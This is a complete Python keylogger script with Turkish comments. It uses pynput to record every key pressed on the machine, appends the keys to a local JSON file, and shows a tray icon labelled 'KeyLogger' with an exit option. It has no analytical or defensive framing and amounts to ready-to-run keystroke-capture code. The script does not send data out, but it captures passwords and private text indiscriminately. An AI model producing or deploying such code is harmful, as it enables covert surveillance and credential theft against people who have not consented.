import json
import os
import threading
from pynput import keyboard
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw

LOG_FILE = "keylog.json"

# JSON dosyasına yazma fonksiyonu
def write_to_json(key_data):
    try:
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w") as file:
                json.dump([], file)

        with open(LOG_FILE, "r+", encoding="utf-8") as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError:
                data = []

            data.append(key_data)
            file.seek(0)
            json.dump(data, file, indent=4)
    except Exception as e:
        print(f"Hata oluştu: {e}")

# Klavye dinleyici fonksiyonu
def on_press(key):
    try:
        key_data = {"key": key.char}  # Normal karakterleri kaydet
    except AttributeError:
        key_data = {"key": str(key)}  # Özel tuşları kaydet (örn. Shift, Ctrl)

    write_to_json(key_data)

# Tepsi simgesi oluşturma
def create_icon():
    icon_image = Image.new("RGB", (64, 64), (255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.rectangle((10, 10, 54, 54), fill="black")
    return icon_image

# Uygulamayı kapatma fonksiyonu
def quit_app(icon, listener):
    listener.stop()
    icon.stop()

def main():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # Klavye dinleyicisini başlat

    icon = Icon("KeyLogger", create_icon(), menu=Menu(
        MenuItem("Çıkış", lambda icon, item: quit_app(icon, listener))
    ))

    icon.run()  # Sistem tepsisinde simgeyi başlat

if __name__ == "__main__":
    main()
